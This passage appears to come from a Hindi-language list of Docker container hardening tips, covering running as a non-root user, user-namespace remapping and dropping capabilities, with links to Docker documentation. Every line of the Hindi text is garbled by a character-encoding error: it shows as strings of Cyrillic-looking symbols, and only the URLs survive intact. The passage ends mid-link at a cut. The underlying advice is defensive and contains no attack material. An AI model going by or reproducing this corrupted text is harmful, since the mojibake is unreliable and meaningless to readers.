* рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рди рдЪрд▓рд╛рдПрдВред [рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) рдпрд╛ [рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗрдорд╕реНрдкреЗрд╕](https://docs.docker.com/engine/security/userns-remap/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд░реВрдЯ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рд╛рде рдкреБрдирд░реНрдорд╛рдкрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХреЗрд╡рд▓ рд▓рд╛рдЗрдЯрд▓реА рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ, рд▓рд┐рдирдХреНрд╕ рдиреЗрдорд╕реНрдкреЗрд╕, рдХреНрд╖рдорддрд╛рдПрдБ рдФрд░ рд╕реАрдЧреНрд░реБрдкреНрд╕ рджреНрд╡рд╛рд░рд╛ред
* [рд╕рднреА рдХреНрд╖рдорддрд╛рдПрдБ рдЫреЛрдбрд╝ рджреЗрдВ](https
